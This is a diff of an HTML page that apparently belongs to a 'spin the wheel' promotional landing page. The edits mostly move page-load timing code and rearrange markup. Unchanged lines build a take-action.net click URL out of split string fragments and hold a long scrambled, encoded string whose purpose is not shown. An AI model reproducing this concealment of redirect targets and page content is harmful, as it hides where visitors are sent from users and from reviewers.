@@ -1,6 +1,22 @@
 ﻿<!DOCTYPE html>
 <html>
 <head>
+    <script type="text/javascript">
+        // Add load event listener.
+        window.addEventListener("load", loadTime, false);
+
+        function loadTime() {
+            // Get current time.
+            var now = new Date().getTime();
+            // Calculate page load time.
+            var page_load_time = now - performance.timing.navigationStart;
+            // Write the load time to the F12 console.
+            if (window.console) console.log("page_load_time ="+ page_load_time);
+        }
+     //   window.onresize = function () {
+       //     document.getElementById("size").innerHTML = window.innerWidth;
+     //   };
+    </script>
 
     <meta charset="utf-8">
     <!-- Always force latest IE rendering engine & Chrome Frame -->
@@ -1368,9 +1384,6 @@
             xheight: 0;
             padding-top: 130%; /* height/width of image */
         }
-
-
-
     </style>
 
     <!--####################>
@@ -1683,40 +1696,11 @@
         .xdivtoberotated {
             transition: all 4s ease 0s;
         }
-    </style>
-
-
-</head>
-<body>
-
-
-
-
-    <p id="time">time</p>
-    <p>Window size: <span id="size"></span> pixels</p>
-    <script>
-        window.onresize = function () {
-            document.getElementById("size").innerHTML = window.innerWidth;
-        };
-    </script>
-    <!--
-    <div id="cont">
-          <div>
-            <p> <a href="http://google.com">xxx2Example</a></p>
-            <p><a href="http://yahoo.com">Foobar.com</a></p>
-        </div>
-        -->
-
-
-
-    <style>
-
-
 
 
 
         .sprite {
-            background-image: url(spritegrid2.png);
+            background-image: url(spritegrid2-tinypng.com.png);
             border-radius: 1rem;
         }
 
@@ -1830,6 +1814,26 @@
     </style>
 
 
+</head>
+<body>
+
+
+
+
+    <p id="time">time</p>
+    <p>Window size: <span id="size"></span> pixels</p>
+    <!--
+    <div id="cont">
+          <div>
+            <p> <a href="http://google.com">xxx2Example</a></p>
+            <p><a href="http://yahoo.com">Foobar.com</a></p>
+        </div>
+        -->
+
+
+
+
+
     <!--
     <i class="sprite sprite-1"></i>
     <i class="sprite sprite-2"></i>
@@ -1853,7 +1857,7 @@
 
 
 
-    <div class="section group bg4">
+    <div class="section bg4">
         <!--  <div><img class="rspnsvc" style="width:100%;background-color:white" src="5b1126f6.png" alt=""></div>
         <div><img class="bg4" style="width:100%;" src="bows-n-pearls.png" alt=""></div>
          -->
@@ -2681,13 +2685,7 @@
                 ? element.attachEvent('on' + myEvent, fnc)
                 : element.addEventListener(myEvent, fnc, false));
         }
-        function msec() {
-            var d = new Date();
-            return  d.getTime();
-           // document.getElementById("demo").innerHTML = n;
-        }
-        var n1,n2,n3;
-
+       
         if (document.readyState !== 'loading') {
             myInitCode('document is  ready');
         } else {
@@ -2698,32 +2696,16 @@
 
             document.addEventListener('DOMContentLoaded', myInitCode('document was not ready'));
         }
+        /*
+        function msec() {
+            var d = new Date();
+            return d.getTime();
+            // document.getElementById("demo").innerHTML = n;
+        }*/
+       // var n1, n2, n3;
 
-
-        function timeload() {
-            
-           
-
-            var loadTime = window.performance.timing.domContentLoadedEventEnd
-                - window.performance.timing.navigationStart;
-             // console.log(loadTime + " asd");
-            // ff2();
-            //1 images lazy load
-
-
-            var x = document.getElementsByClassName("q75");
-            var i;
-            for (i = 0; i < x.length; i++) {
-                //console.log(x[i].classList);
-                x[i].classList.remove("lz");
-                //console.log(x[i].classList);
-            }
-            n2 = msec();
-            document.getElementById("time").innerText = 'load time is ' + loadTime +"  "+ (n2 - n1);
-
-        }
-
-        window.onload = timeload;
+       
+        //window.onload = windowonload;
 
         //WHEEL
         var wheel;
@@ -2731,7 +2713,7 @@
         var clk = "https://" + "go." + "take-" + "action." + "net/" + "click/1";
 
         function myInitCode(s) {
-             n1 = msec();
+           // n1 = msec();
 
             console.log(s);
 
@@ -2853,9 +2835,39 @@
                 monthNames[now.getMonth()] + " " + now.getDate() + ", " + now.getFullYear();
 
         }
+       
+
+
+        window.onload = function () {
 
 
 
+           // var loadTime = window.performance.timing.domContentLoadedEventEnd
+             //   - window.performance.timing.navigationStart;
+            // console.log(loadTime + " asd");
+            // ff2();
+            //1 images lazy load
+
+
+            var x = document.getElementsByClassName("q75");
+            var i;
+            for (i = 0; i < x.length; i++) {
+                //console.log(x[i].classList);
+                x[i].classList.remove("lz");
+                //console.log(x[i].classList);
+            }
+            //n2 = msec();
+            //document.getElementById("time").innerText = 'load time is ' + loadTime + "  " + (n2 - n1);
+
+            // Get current time.
+            var now = new Date().getTime();
+            // Calculate page load time.
+            var page_load_time = now - performance.timing.navigationStart;
+            // Write the load time to the F12 console.
+            if (window.console) console.log("page_load_time =" + page_load_time);
+
+
+        }
 
 
         var s4 = '3sfewmtn%7Ceoifr%3Bdrxm%3Bqcghnnh%3C3%3Frasilr%3F0%3Cddgpgsqxri%3A%24%3A3%3C581%7F1kwovr%3Dfjfpth03gsqxt%3Fagvhv%80cppwist%3B%24%25%3Fiitroe%7E%3Aucepj%7D/iuszp%3Bcixjr%7Ceoifr%3Bdrxm%7D/iuszp%7C%7Crsr%3A2%7F1gtl%7Cflwulb%7B%3Dfqodm%3Ejqobv%3Dpjfu%3Dwi%7Dt.comln%3Behryes%3Disst.ul%7Ej%3A205ir%3Bccfolrpwqh%3F%23eeggic%3Crdhiioi%3D4%250%213s%7C%250%3Codvlio%3C3%81goe%7B%7Etfdekqk%3F0%214hq%250%214hq@fppw%3E601%272534%21%24Kiqvfvlgf%20Ogxi%27%2Cbtleq%2Cigozjtjed0memxh0xaou0wjrjh%80l6%7Bgqqx2sj%7Ch%3E6.9gp%3Frasilr2lfhw%3E6en%3Dpewgjp0vngiv%3D5jm%7Ej5%7Fkoov0wnzf%3C42%3Aen%7F1ljaegu%7Fuaeflrl%3A2gp%245%3Bug%7Bx2amkjr%3Fcfpwiw%3Bxkgxm%3A92%28%3Frasilr2lfhw%3Efuuq%3Eqfrhkq1wihjw%3Efuuq%802HaqvLqlTyv%7Es%7Beshos%7C%3Abwws@bbenkwovpg%3E%28ddffhh%3Bncuknn%3B3hq%251fo%234%251fo%802HaqvLqlLfhw%7Fklpcw%3Eqegv%3E%7Bnduj%3D95%25%3Cjhmlhu%3Cdyyo%3Codvlio/umlhu%3C4ir%7D/EdtyIniUmlhu%7Diptau%3CUmlhu%3Dzmiti%3C84*%3Biglkmt%3Bcxxt%3Bncuknn.nhjy%3A2gp%813rfussssjxh%7Fray/zmiti%3C445%25%3Cjhmlhu%3Cdyyo%3Cflwulb%7B%3Dfqodm%3Eqfrhkq1qegv%3Deztp%3Dpewgjp0vngiv%3Deztp%7F1fztuqq%7Fgadmjvtuof0gtlpt%3D%27k07%3Deswdft%3D4@cpnrv%3Fwikwi@pbfgmsg%3B38t%7D%2084s%7C@tfzw1fljiq%3Eheovhv@tfzw1iedqueyipp%3Drtnf%3Dwi%7Dt.ukeiox%3C6t%7D%204r%7B%24%28012%3Ehnsqnd%7D%3Fionlrj-cnrgp%3Bgqqx2sj%7Ch%3E76qz%3Eqfrhkq%3E9py%225t%7D%3Bdwuwtr%3Brrmstft%802xpbpOV%80wjfwl%3Fcbnf%2C601%27-6413+%802xpbpF%7F%7Cievk%3Ehame+550%26%2C%3B362*%7FCqjdjc%23sslz%22vgwefp%23esd%21*pe%7D-xkgxm%3A2284ux*%7D1wuaoE%7E%7Bnduj%3Dgfld*445%25+33362*%7F1wuaoNU%7F%7Cievk%3Ehame+550%26%2C4362*%7F%80Dreekd%24tnm%7B%23whrfgq%24fne%22+qfx.ylhyh%3B%3A34ux*%7D1wuaoE%7E%7Bnduj%3D550%26%7F1wuaoNU%7F%7Cievk%3E5%7D%7EBpiiib%22rrqy%21ufvjeo%22dri%20%29od%7C2wjfwl%3F662s%7C.%7Bcqg%7D%80pbfgmsg%3B2%802WetrLqlTyvZvfp62Oikt-0UixpJojX%7DtXtdt%3A0Skjly%7Bgnrey%3Aoqqi@mbz0%7Bnduj%3D550%26%3Dkingiv%3Deztp%3Dpewgjp0fttuqp%3E6en%3Dgmxpmc%7C%3Eglpen%3Frasilr2lfhw%3Efuuq%3Eqfrhkq1wihjw%3Efuuq%802HaqvLqlLfhw03CbrwMrgSkjly%7Bgnrey%3Aoqqi@wjfwl%3F112%28%3Fmejikx%3Favvr%3Frasilr2bpvwsr%3A2gp%3Fiitroe%7E%3Acnrgp%3Bncuknn.nhjy%3Abwws@mbtjms-skjly%3Abwws%82%23ec%7C%7Fiitroe%7E%3Aoqqi%82%7D';
